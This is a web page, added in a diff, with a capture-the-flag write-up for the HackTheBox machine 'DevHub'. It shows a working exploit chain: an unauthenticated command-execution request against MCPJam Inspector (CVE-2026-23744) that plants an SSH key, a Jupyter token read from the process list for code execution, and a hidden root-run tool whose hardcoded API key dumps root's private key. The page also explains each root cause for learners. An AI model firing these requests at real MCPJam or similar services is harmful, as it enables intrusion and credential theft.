@@ -1,0 +1,613 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; base-uri 'self'; form-action 'self'; object-src 'none'; script-src 'self' https://static.cloudflareinsights.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self' https://cloudflareinsights.com; worker-src 'self' blob:;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<style>.writeup-back-link:hover{transform:translateX(-2px);background:rgba(26,26,24,1)!important;}</style>
+<title>HTB: DevHub — S. Markakis</title>
+<meta name="description" content="HackTheBox DevHub — unauthenticated RCE in MCPJam Inspector (CVE-2026-23744), a leaked Jupyter token for code execution as analyst, and a hidden root-run MCP tool with a hardcoded API key that dumps root's SSH private key.">
+<meta property="og:title" content="HTB: DevHub — S. Markakis">
+<meta property="og:description" content="HackTheBox DevHub — unauthenticated RCE in MCPJam Inspector (CVE-2026-23744), a leaked Jupyter token for code execution as analyst, and a hidden root-run MCP tool with a hardcoded API key that dumps root's SSH private key.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://s-markakis.github.io/writeups/htb-devhub.html">
+<meta property="og:image" content="https://s-markakis.github.io/writeups/assets/og/htb-devhub.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s-markakis.github.io/writeups/assets/og/htb-devhub.png">
+<link rel="canonical" href="https://s-markakis.github.io/writeups/htb-devhub.html">
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Barlow+Condensed:wght@700;800&family=Barlow:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../style.css">
+<style>
+  :root {
+    --bg:        #eae8e3;
+    --bg-code:   #dddbd5;
+    --bg-term:   #d4d2cc;
+    --text:      #888880;
+    --text-dark: #1a1a18;
+    --text-mid:  #555550;
+    --border:    #c8c6c0;
+    --tag-bg:    #d8d6d0;
+    --tag-text:  #555550;
+    --accent:    #1a1a18;
+    --t-user:    #4a7c59;
+    --t-host:    #5a6e8a;
+    --t-path:    #7a6040;
+    --t-cmd:     #1a1a18;
+    --t-out:     #666660;
+    --t-yellow:  #8a7030;
+    --t-red:     #8a3030;
+    --t-green:   #3a6a48;
+    --t-comment: #aaa89f;
+    --t-blue:    #3a5a7a;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Barlow', sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  .wrapper {
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    max-width: 780px;
+    margin: 0 auto;
+    padding: 4rem 2rem 8rem;
+  }
+
+  .post-header { margin-bottom: 2.5rem; }
+
+  h1 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 3.2rem;
+    line-height: 1.05;
+    color: var(--text-dark);
+    letter-spacing: -.01em;
+    margin-bottom: 1rem;
+  }
+
+  .post-meta {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    flex-wrap: wrap;
+  }
+  .post-meta .date { color: var(--text); }
+
+  .tag {
+    background: var(--tag-bg);
+    color: var(--tag-text);
+    font-size: 0.72rem;
+    font-weight: 600;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    padding: .2rem .6rem;
+    border-radius: 3px;
+  }
+  .tag-htb  { background: #c8d8c0; color: #2a4a28; }
+  .tag-lin  { background: #d8d0c0; color: #4a3a20; }
+
+  .divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 2rem 0;
+  }
+
+  .overview {
+    background: var(--bg-code);
+    border-left: 3px solid var(--text-dark);
+    padding: 1.2rem 1.5rem;
+    margin: 2rem 0;
+    font-size: 0.95rem;
+    line-height: 1.7;
+    color: var(--text-mid);
+  }
+
+  .chain {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    gap: .4rem;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    padding: .9rem 1.2rem;
+    border-radius: 4px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.74rem;
+    margin: 1.5rem 0 2.5rem;
+    color: var(--text-mid);
+  }
+  .chain-node {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    color: var(--text-dark);
+    padding: .2rem .7rem;
+    border-radius: 3px;
+    font-weight: 500;
+  }
+  .chain-arrow { color: var(--text); }
+
+  h2 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 1.9rem;
+    color: var(--text-dark);
+    margin: 3rem 0 .8rem;
+    letter-spacing: -.01em;
+  }
+
+  h3 {
+    font-family: 'Barlow', sans-serif;
+    font-weight: 600;
+    font-size: 1.1rem;
+    color: var(--text-dark);
+    margin: 2rem 0 .6rem;
+  }
+
+  p { color: var(--text); margin-bottom: 1rem; }
+
+  strong { color: var(--text-dark); font-weight: 600; }
+
+  a { color: var(--text-mid); }
+
+  code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.82em;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    color: var(--text-mid);
+    padding: .1em .4em;
+    border-radius: 3px;
+  }
+
+  .terminal {
+    background: var(--bg-term);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.4rem 0;
+    overflow: hidden;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.8rem;
+    line-height: 1.65;
+  }
+  .term-bar {
+    background: var(--bg-code);
+    border-bottom: 1px solid var(--border);
+    padding: .45rem 1rem;
+    display: flex;
+    align-items: center;
+    gap: .4rem;
+  }
+  .dot { width: 11px; height: 11px; border-radius: 50%; }
+  .dr { background: #c07070; }
+  .dy { background: #b8a050; }
+  .dg { background: #60a070; }
+  .term-label {
+    margin-left: auto;
+    font-size: 0.7rem;
+    color: var(--text);
+    letter-spacing: .05em;
+  }
+  .term-body {
+    padding: 1rem 1.3rem;
+    overflow-x: auto;
+    white-space: pre;
+  }
+
+  .pu  { color: var(--t-user);    font-weight: 700; }
+  .ph  { color: var(--t-host);    font-weight: 700; }
+  .pp  { color: var(--t-path); }
+  .ps  { color: var(--t-comment); }
+  .pd  { color: var(--text-mid); }
+  .pc  { color: var(--t-cmd);     font-weight: 500; }
+  .po  { color: var(--t-out); }
+  .py  { color: var(--t-yellow); }
+  .pr  { color: var(--t-red); }
+  .pg  { color: var(--t-green); }
+  .pb  { color: var(--t-blue); }
+  .pco { color: var(--t-comment); }
+
+  .alert {
+    padding: .9rem 1.2rem;
+    margin: 1.4rem 0;
+    border-left: 3px solid;
+    font-size: 0.92rem;
+    border-radius: 0 4px 4px 0;
+  }
+  .alert-info    { background: #d8dde8; border-color: var(--t-blue);  color: #2a3a5a; }
+  .alert-warn    { background: #e8e0c8; border-color: var(--t-yellow); color: #5a4010; }
+  .alert-success { background: #d0ddd0; border-color: var(--t-green); color: #1a3a20; }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.4rem 0;
+    font-size: 0.88rem;
+  }
+  th {
+    text-align: left;
+    padding: .55rem 1rem;
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 700;
+    font-size: 0.8rem;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    color: var(--text-mid);
+    border-bottom: 2px solid var(--border);
+    background: var(--bg-code);
+  }
+  td {
+    padding: .5rem 1rem;
+    border-bottom: 1px solid var(--border);
+    color: var(--text);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.78rem;
+  }
+  tr:hover td { background: var(--bg-code); }
+
+  ul, ol { padding-left: 1.5rem; margin-bottom: 1rem; }
+  li { color: var(--text); margin-bottom: .3rem; }
+
+  .st td:nth-child(1) { color: var(--text-dark); font-weight: 600; }
+  .st td:nth-child(2) { color: var(--text-mid); }
+
+  footer {
+    border-top: 1px solid var(--border);
+    padding: 2rem 3rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 0.82rem;
+    color: var(--text);
+  }
+  footer a { color: var(--text-mid); text-decoration: none; }
+  footer a:hover { color: var(--text-dark); }
+
+  .back {
+    display: inline-flex;
+    align-items: center;
+    gap: .4rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    text-decoration: none;
+    margin-bottom: 2.5rem;
+    transition: color .15s;
+  }
+  .back:hover { color: var(--text-dark); }
+
+  .screenshot {
+    max-width: 100%;
+    height: auto;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.6rem auto;
+    display: block;
+  }
+  picture { display: block; }
+
+  @media (max-width: 600px) {
+    nav { padding: 1rem 1.2rem; }
+    .wrapper { padding: 2rem 1.2rem 5rem; }
+    h1 { font-size: 2.4rem; }
+  }
+</style>
+<script src="../js/theme.js"></script>
+<style>
+  body.dark {
+    --bg:#0f0f0f; --bg-code:#161616; --bg-term:#161616; --border:#2a2a2a;
+    --text:#959086; --text-dark:#f4f3ef; --text-mid:#d4d2cc;
+    --tag-bg:#1e1e1e; --tag-text:#999690; --accent:#f4f3ef;
+    --t-user:#6a9c79; --t-host:#7a8eaa; --t-path:#9a8060; --t-cmd:#f4f3ef;
+    --t-out:#a6a69c; --t-yellow:#aa9050; --t-red:#aa5050; --t-green:#5a8a68;
+    --t-comment:#7a7870; --t-blue:#5a7a9a;
+  }
+</style>
+<script id="sp1r4-jsonld" type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB: DevHub",
+  "description": "HackTheBox DevHub — unauthenticated RCE in MCPJam Inspector (CVE-2026-23744), a leaked Jupyter token for code execution as analyst, and a hidden root-run MCP tool with a hardcoded API key that dumps root's SSH private key.",
+  "datePublished": "2026-09-09",
+  "dateModified": "2026-09-09",
+  "author": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "publisher": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "url": "https://s-markakis.github.io/writeups/htb-devhub.html",
+  "image": "https://s-markakis.github.io/writeups/assets/og/htb-devhub.png",
+  "keywords": [
+    "offensive",
+    "htb"
+  ],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://s-markakis.github.io/blog.html#htb-devhub"
+  },
+  "timeRequired": "PT7M"
+}
+</script>
+</head>
+<body class="has-nav">
+<nav id="site-nav"></nav>
+<a href="../blog.html" class="writeup-back-link" style="position:fixed;top:66px;left:18px;z-index:51;display:inline-flex;align-items:center;gap:8px;padding:8px 14px;background:rgba(26,26,24,0.92);color:#eae8e3;font-family:'Barlow',sans-serif;font-size:12px;font-weight:500;letter-spacing:0.04em;text-decoration:none;border-radius:4px;border:0.5px solid rgba(234,232,227,0.15);backdrop-filter:blur(8px);transition:transform 0.18s,background 0.18s;"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Back to blog</a>
+
+<div class="wrapper">
+
+  <a class="back" href="https://s-markakis.github.io/blog.html">← Back to posts</a>
+
+  <div class="post-header">
+    <h1>HTB: DevHub</h1>
+    <div class="post-meta">
+      <span class="date">September 9, 2026</span>
+      <span class="tag tag-htb">HackTheBox</span>
+      <span class="tag tag-lin">Linux</span>
+      <span class="tag">Easy</span>
+      <span>&nbsp;10 min read</span>
+    </div>
+  </div>
+
+  <hr class="divider">
+
+  <div class="overview">
+    DevHub is a tour of an <strong>MCP developer toolchain</strong> gone wrong — no memory-corruption, no clever exploit primitive, just three services trusting each other more than they should. The entry point is a fresh 2026 bug: <strong>CVE-2026-23744</strong>, unauthenticated RCE in <strong>MCPJam Inspector</strong>, which will happily spawn any process you name. From that foothold it's a chain of leaked secrets — a <strong>Jupyter token</strong> sitting in the process list, source code you can read but shouldn't, and a "hidden" MCP admin tool running as root that hands over root's SSH key for the asking. A great example of how AI-tooling sprawl adds attack surface that behaves like classic misconfiguration.
+  </div>
+
+  <picture data-img-optimized="1"><source srcset="assets/htb-devhub/img-attack-chain.webp" type="image/webp"><img class="screenshot" src="assets/htb-devhub/img-attack-chain.png" alt="DevHub compromise chain: unauthenticated MCPJam Inspector RCE (CVE-2026-23744) plants an SSH key for mcp-dev, ss and ps leak a Jupyter token, the token drives the Jupyter kernel API to run code as analyst for user.txt, analyst reads the opsmcp Flask source with a hardcoded API key and a hidden ops._admin_dump tool, and calling that root-run tool dumps root's id_rsa for root.txt" width="1568" height="584" loading="lazy" decoding="async"></picture>
+
+  <div class="chain">
+    <span class="chain-node">MCPJam :6274</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">CVE-2026-23744 RCE</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">mcp-dev (SSH)</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">leaked Jupyter token</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">analyst</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">hidden MCP tool</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">root id_rsa</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">root</span>
+  </div>
+
+  <!-- ══ RECON ══ -->
+  <h2>Reconnaissance</h2>
+
+  <p>Three ports: SSH, HTTP, and an unusual one on <strong>6274</strong>.</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">nmap</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">nmap -sC -sV -p- --min-rate 5000 &lt;TARGET_IP&gt;</span>
+<span class="po">22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu
+80/tcp   open  http     nginx
+|_http-title: Did not follow redirect to http://devhub.htb/
+6274/tcp open  http     Node.js</span></div>
+  </div>
+
+  <p>The port-80 landing page is an "Internal Development &amp; Analytics Platform" and calls out three components — an <strong>MCP Inspector</strong> on port 6274, a Jupyter-based Analytics Dashboard (internal, <code>localhost:8888</code>), and a Code Repository. Browsing to <code>http://devhub.htb:6274</code> opens <strong>MCPJam</strong>; its Settings page reports <strong>MCPJam Version: v1.4.2</strong>.</p>
+
+  <div class="alert alert-info"><strong>MCP</strong> = Model Context Protocol, the standard for wiring LLM agents to tools. MCPJam Inspector is a developer UI for building and testing MCP servers — the sort of AI-adjacent tooling that ships fast and gets exposed by accident.</div>
+
+  <!-- ══ FOOTHOLD ══ -->
+  <h2>Foothold — CVE-2026-23744 (MCPJam Inspector RCE)</h2>
+
+  <p>MCPJam Inspector ≤ 1.4.2 binds to <code>0.0.0.0</code> and exposes an <strong>unauthenticated</strong> <code>POST /api/mcp/connect</code>. The endpoint takes a <code>serverConfig</code> describing a <em>stdio</em> MCP server to launch — and it spawns that <code>command</code> with those <code>args</code> directly on the host. There's no allow-list: name any binary and it runs. That's arbitrary command execution, no auth, pre-everything (patched in 1.4.3).</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">the vulnerable request</span>
+    </div>
+    <div class="term-body"><span class="po">POST /api/mcp/connect HTTP/1.1
+Content-Type: application/json
+
+{"serverConfig":{"command":</span><span class="pr">"bash"</span><span class="po">,"args":[</span><span class="pr">"-c","&lt;your command&gt;"</span><span class="po">],"env":{}},"serverId":"pwn"}</span></div>
+  </div>
+
+  <p>Public PoCs fire a reverse shell here. I went for something more stable: rather than catch a shell, use the single command execution to <strong>plant my SSH public key</strong> in the running user's <code>authorized_keys</code>, then log in properly. One request:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">RCE → SSH key persistence</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">ssh-keygen -t ed25519 -f devhub_key -N ''</span>
+<span class="pd">$ </span><span class="pc">CMD="mkdir -p ~/.ssh &amp;&amp; echo '$(cat devhub_key.pub)' &gt;&gt; ~/.ssh/authorized_keys"</span>
+<span class="pd">$ </span><span class="pc">curl -s http://&lt;TARGET_IP&gt;:6274/api/mcp/connect -H 'Content-Type: application/json' \
+     -d "{\"serverConfig\":{\"command\":\"bash\",\"args\":[\"-c\",\"$CMD\"],\"env\":{}},\"serverId\":\"pwn\"}"</span>
+<span class="po">{"success":false,"error":"...MCP error -32000: Connection closed"}   </span><span class="pco"># expected: bash ran, then exited</span></div>
+  </div>
+
+  <p>The MCP handshake "fails" because our <code>bash</code> ran the append and exited instead of speaking the protocol — but the command executed. The key lands, and we get a clean session:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">ssh mcp-dev@devhub</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">ssh -i devhub_key mcp-dev@&lt;TARGET_IP&gt;</span>
+<span class="pu">mcp-dev</span><span class="ps">@</span><span class="ph">devhub</span><span class="ps">:</span><span class="pp">~</span><span class="ps">$ </span><span class="pc">id</span><span class="po">
+uid=1001(mcp-dev) gid=1001(mcp-dev) groups=1001(mcp-dev)</span></div>
+  </div>
+
+  <!-- ══ INTERNAL RECON ══ -->
+  <h2>Internal Recon — Two Loopback Services</h2>
+
+  <p>The interesting surface is bound to localhost. <code>ss -tulpn</code> shows two internal listeners the external scan couldn't see:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">ss -tulpn</span>
+    </div>
+    <div class="term-body"><span class="pu">mcp-dev</span><span class="ps">@</span><span class="ph">devhub</span><span class="ps">:</span><span class="pp">~</span><span class="ps">$ </span><span class="pc">ss -tulpn | grep LISTEN</span>
+<span class="po">127.0.0.1:</span><span class="py">5000</span><span class="po">    LISTEN     </span><span class="pco"># Flask "opsmcp" — running as root</span><span class="po">
+127.0.0.1:</span><span class="py">8888</span><span class="po">    LISTEN     </span><span class="pco"># Jupyter Lab — running as analyst</span><span class="po">
+0.0.0.0:6274     LISTEN     </span><span class="pco"># MCPJam</span><span class="po">
+0.0.0.0:22 / :80</span></div>
+  </div>
+
+  <p>Jupyter needs a token, and Jupyter puts its token <strong>on its own command line</strong>. <code>ps</code> hands it over, and shows the Flask app's owner too:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">ps aux — the token is right there</span>
+    </div>
+    <div class="term-body"><span class="pu">mcp-dev</span><span class="ps">@</span><span class="ph">devhub</span><span class="ps">:</span><span class="pp">~</span><span class="ps">$ </span><span class="pc">ps aux | grep -E 'jupyter|opsmcp'</span>
+<span class="po">analyst  jupyter-lab --ip=127.0.0.1 --port=8888 --notebook-dir=/home/analyst/notebooks \
+         </span><span class="pr">--ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7</span><span class="po">
+</span><span class="pr">root</span><span class="po">     /home/analyst/jupyter-env/bin/python3 </span><span class="pr">/opt/opsmcp/server.py</span></div>
+  </div>
+
+  <div class="alert alert-warn">Secrets on a command line are visible to every user on the box via <code>/proc/&lt;pid&gt;/cmdline</code> — that's what <code>ps</code> reads. Tokens, passwords and keys belong in environment files or a secrets store with restrictive perms, never in <code>argv</code>.</div>
+
+  <!-- ══ ANALYST ══ -->
+  <h2>analyst &amp; user.txt — Jupyter Code Execution</h2>
+
+  <p>Both internal services are loopback-only, so I forwarded them over the SSH session (<code>-L 8888:127.0.0.1:8888 -L 5000:127.0.0.1:5000</code>). With the token, Jupyter's <strong>kernel API</strong> is a code-execution primitive: start a kernel over REST, then push an <code>execute_request</code> over the kernel WebSocket. Anything you run executes as <strong>analyst</strong>:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">Jupyter kernel exec → analyst</span>
+    </div>
+    <div class="term-body"><span class="pco"># POST /api/kernels (Authorization: token …) → open ws /api/kernels/&lt;id&gt;/channels</span>
+<span class="pco"># send execute_request with:</span>
+<span class="pc">import os; print(os.popen("id; cat /home/analyst/user.txt").read())</span>
+<span class="po">uid=1002(analyst) gid=1002(analyst) groups=1002(analyst)
+</span><span class="pg">[redacted — user flag]</span></div>
+  </div>
+
+  <div class="alert alert-info">A Jupyter server <em>is</em> a remote code-execution service by design — its whole job is to run code you send it. The only thing standing between the network and arbitrary execution is that token, and here the token was readable by any local user.</div>
+
+  <!-- ══ ROOT ══ -->
+  <h2>Root — The Hidden MCP Tool</h2>
+
+  <p>As analyst we can now read <code>/opt/opsmcp/server.py</code> (owner <code>analyst:analyst</code>, mode <code>0640</code>) — the source of that root-owned Flask app on port 5000. It's an "operations" API that exposes MCP-style tools, and it has two problems baked in:</p>
+
+  <picture data-img-optimized="1"><source srcset="assets/htb-devhub/img-hidden-tool-privesc.webp" type="image/webp"><img class="screenshot" src="assets/htb-devhub/img-hidden-tool-privesc.png" alt="Privesc via the hidden MCP tool: analyst reads /opt/opsmcp/server.py which defines VISIBLE_TOOLS, HIDDEN_TOOLS and a hardcoded VALID_API_KEY; /tools/list returns only visible tools but /tools/call validates against ALL_TOOLS so the unlisted ops._admin_dump is callable, and running as root it opens and returns /root/.ssh/id_rsa" width="1568" height="701" loading="lazy" decoding="async"></picture>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">/opt/opsmcp/server.py (excerpt)</span>
+    </div>
+    <div class="term-body"><span class="pr">VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"</span><span class="po">   </span><span class="pco"># hardcoded</span><span class="po">
+
+VISIBLE_TOOLS = { "ops.system_status": ..., "ops.list_services": ..., ... }
+</span><span class="pr">HIDDEN_TOOLS  = { "ops._admin_dump": ..., "ops._debug_mode": ... }</span><span class="po">
+ALL_TOOLS     = {**VISIBLE_TOOLS, **HIDDEN_TOOLS}
+
+@app.route('/tools/list')
+def list_tools():
+    return jsonify({"tools": list(</span><span class="pr">VISIBLE_TOOLS</span><span class="po">.keys())})   </span><span class="pco"># hides the admin tool</span><span class="po">
+
+@app.route('/tools/call', methods=['POST'])
+def call_tool():
+    if tool_name not in </span><span class="pr">ALL_TOOLS</span><span class="po">: ...                    </span><span class="pco"># but accepts it anyway</span><span class="po">
+    if tool_name == "ops._admin_dump" and target == "ssh_keys":
+        return open('</span><span class="pr">/root/.ssh/id_rsa</span><span class="po">').read()          </span><span class="pco"># runs as root</span></div>
+  </div>
+
+  <p>The tool is "hidden" only in the sense that <code>/tools/list</code> doesn't advertise it — <code>/tools/call</code> validates against <code>ALL_TOOLS</code>, so it's fully callable. And because the whole process runs as root, it can read root's private key. One request with the leaked key:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">call the hidden tool → root's id_rsa</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">curl -s http://127.0.0.1:5000/tools/call \
+     -H 'X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a' \
+     -H 'Content-Type: application/json' \
+     -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'</span>
+<span class="pg">{"root_private_key":"-----BEGIN OPENSSH PRIVATE KEY-----\n..."}</span></div>
+  </div>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">ssh root@devhub</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">chmod 600 root_id_rsa &amp;&amp; ssh -i root_id_rsa root@&lt;TARGET_IP&gt;</span>
+<span class="pu">root</span><span class="ps">@</span><span class="ph">devhub</span><span class="ps">:</span><span class="pp">~</span><span class="ps"># </span><span class="pc">id &amp;&amp; cat /root/root.txt</span><span class="po">
+uid=0(root) gid=0(root) groups=0(root)
+</span><span class="pg">[redacted — root flag]</span></div>
+  </div>
+
+  <div class="alert alert-success">Two failures stack here: a <strong>hardcoded credential</strong> in source, and treating <strong>obscurity as authorization</strong> — an unlisted endpoint is still an endpoint. A privileged service that exposes a "dump credentials" operation at all is the real problem; hiding it from a listing changes nothing.</div>
+
+  <!-- ══ WRAP ══ -->
+  <h2>Why it worked</h2>
+
+  <table class="st">
+    <tr><th>Stage</th><th>Root cause</th></tr>
+    <tr><td>→ mcp-dev</td><td>MCPJam Inspector ≤1.4.2 spawns an attacker-named process from an unauthenticated endpoint bound to 0.0.0.0 — CVE-2026-23744 (CWE-78 / CWE-306)</td></tr>
+    <tr><td>→ analyst</td><td>Jupyter token passed on the command line, readable by any local user via <code>ps</code> / <code>/proc</code> (CWE-214 / CWE-522)</td></tr>
+    <tr><td>→ root</td><td>Root service with a hardcoded API key and a callable "hidden" tool that dumps <code>/root/.ssh/id_rsa</code> (CWE-798 / CWE-269 / security-by-obscurity)</td></tr>
+  </table>
+
+  <h2>Key commands</h2>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">quick reference</span>
+    </div>
+    <div class="term-body"><span class="pco"># 1. MCPJam RCE → plant SSH key → mcp-dev</span>
+<span class="pc">curl http://&lt;IP&gt;:6274/api/mcp/connect -d \
+  '{"serverConfig":{"command":"bash","args":["-c","echo KEY >> ~/.ssh/authorized_keys"]},"serverId":"x"}'</span>
+<span class="pc">ssh -i devhub_key mcp-dev@&lt;IP&gt;</span>
+
+<span class="pco"># 2. Leak Jupyter token, forward the internal services</span>
+<span class="pc">ps aux | grep jupyter            # --ServerApp.token=...</span>
+<span class="pc">ssh -i devhub_key -L 8888:127.0.0.1:8888 -L 5000:127.0.0.1:5000 mcp-dev@&lt;IP&gt;</span>
+
+<span class="pco"># 3. Jupyter kernel API → code exec as analyst → user.txt</span>
+<span class="pc"># POST /api/kernels + ws execute_request:  os.popen("cat /home/analyst/user.txt")</span>
+
+<span class="pco"># 4. Read the Flask source, call the hidden root tool → root.txt</span>
+<span class="pc">curl http://127.0.0.1:5000/tools/call -H 'X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a' \
+  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'</span>
+<span class="pc">ssh -i root_id_rsa root@&lt;IP&gt;</span></div>
+  </div>
+
+</div>
+<footer>
+  <span>© 2026 <a href="https://s-markakis.github.io/index.html">S. Markakis</a></span>
+  <span><a href="https://s-markakis.github.io/blog.html">← All posts</a></span>
+</footer>
+
+<script src="../js/i18n.js" defer></script>
+<script src="../js/nav.js" defer></script>
+<script src="../js/writeup-sidebar.js" defer></script>
+<script src="../js/writeup-enhance.js" defer></script>
+</body>
+</html>
